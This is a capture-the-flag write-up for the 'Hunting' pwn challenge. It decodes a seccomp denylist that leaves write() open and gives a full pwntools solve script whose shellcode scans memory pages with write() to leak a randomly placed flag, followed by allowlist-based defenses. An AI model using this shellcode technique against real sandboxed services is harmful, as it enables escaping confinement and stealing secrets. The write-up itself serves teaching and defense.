## Overview

Hunting is an Easy Pwn challenge that hands you arbitrary code execution and then asks you to *find* something. A 32-bit binary hides the flag in a memory page at a **random** address, locks the process down with a seccomp filter, and runs 60 bytes of your shellcode. The whole solve is a single idea: the seccomp [protection mechanism fails](https://cwe.mitre.org/data/definitions/693.html) because it's a denylist that forgets `write()`, and `write()` can be abused as a crash-proof memory scanner to locate the flag.

## The technique

Reverse-engineering `main` (i386 PIE, stripped) shows three moves:

1. **Hide the flag at a random address.** The binary reads 8 bytes from `/dev/urandom`, seeds `srand()`, and loops `rand() << 16` until the value lands in `(0x5fffffff, 0xf7000000]`. Because of the `<< 16`, that address is always **64KB-aligned**. It `mmap`s a read/write page there, `strcpy`s the flag in, then `memset`s the original copy in `.data` to zero.
2. **Lock down syscalls.** `prctl(PR_SET_NO_NEW_PRIVS)` then `prctl(PR_SET_SECCOMP)` install a 14-instruction BPF filter.
3. **Run your code.** It `mmap`s a read/write/execute page, `read`s `0x3c` (60) bytes of your shellcode into it, and `call`s it, with a 10-second `alarm()` as a watchdog.

The seccomp `sock_filter` array lives in `.data` — each instruction is 8 bytes (`code:u16, jt:u8, jf:u8, k:u32`), so you can decode it straight from the ELF without seccomp-tools:

```
KILL if syscall >= 0x40000000    (x32 ABI bit)
KILL if syscall == execve(11), 358, 295, open(5), close(6), creat(8), uselib(86), fork(2), vfork(190)
ALLOW everything else            <-- read(3) and write(4) survive
```

It's a **blacklist**. That is the bug: the author enumerated syscalls to block and left `write` open. You don't need `execve` or `open` — the flag is already in your address space.

The flag is at an unknown, randomized address, and dereferencing one of the ~38,000 *unmapped* 64KB-aligned candidates raises SIGSEGV and kills the process. The trick that names the challenge:

> `write(fd, addr, len)` returns `-EFAULT` for unmapped memory **instead of crashing.**

So treat `write` as a fault-tolerant memory probe. Loop over every 64KB-aligned page in the range and `write(1, page, 0x40)`. Unmapped pages return `-EFAULT` and print nothing; the one mapped flag page dumps its bytes to stdout. The shellcode is 37 bytes — comfortably inside the 60-byte budget.

## Solution

`solve.py` assembles the hunter, sends it, and greps stdout for the flag. Run it against the binary locally first — the shipped copy carries a placeholder `HTB{XXXX...}` in `.data`, so a local run proves the technique before you ever touch the remote instance.

Create `solve.py`:

```python
import sys, re
from pwn import *

context.update(arch='i386', os='linux')
EXE = './hunting'

# 37-byte shellcode: scan every 64KB-aligned page, write() each (EFAULT = harmless)
sc = asm('''
    mov esi, 0x60000000
loop:
    push 4
    pop eax            /* sys_write */
    push 1
    pop ebx            /* fd = stdout */
    mov ecx, esi       /* buf = candidate page */
    push 0x40
    pop edx            /* len = 0x40 (flag is 37 bytes) */
    int 0x80
    add esi, 0x10000   /* next 64KB-aligned page (rand()<<16 is 64KB-aligned) */
    cmp esi, 0xf7000000
    jbe loop
    push 1
    pop eax            /* sys_exit */
    int 0x80
''')
assert len(sc) <= 0x3c

if len(sys.argv) >= 2 and ':' in sys.argv[1]:
    host, port = sys.argv[1].split(':')
    io = remote(host, int(port))
else:
    io = process(EXE)

io.send(sc)
io.shutdown('send')
data = io.recvall(timeout=8)
m = re.search(rb'HTB\{[^}]*\}', data)
print('[+] FLAG:', m.group().decode() if m else '(not found)')
```

Run it:

```bash
python3 solve.py <host>:<port>
```

```
[+] FLAG: HTB{...}
```

## Why it worked

Two design mistakes compound. First, the seccomp filter is a **denylist** — it's fail-open, so every syscall the author didn't think to block (here `write` and `read`) is a hole, and those two are enough to exfiltrate any byte already in the process. Second, randomizing the flag's address isn't real confinement: `rand() << 16` forces 64KB alignment, shrinking the search to ~38k candidates, and `write`'s `-EFAULT` return lets you brute-force all of them without a single crash.

## Fix / defense

- Use an **allowlist** seccomp filter: default `SECCOMP_RET_KILL_PROCESS`, then `ALLOW` only the exact syscalls the workload needs.
- Don't keep a secret mapped in the same address space as untrusted code; if you must, constrain `write` by file descriptor or argument, not just by syscall number.
- Audit the filter against the whole syscall table, including x32/compat aliases.
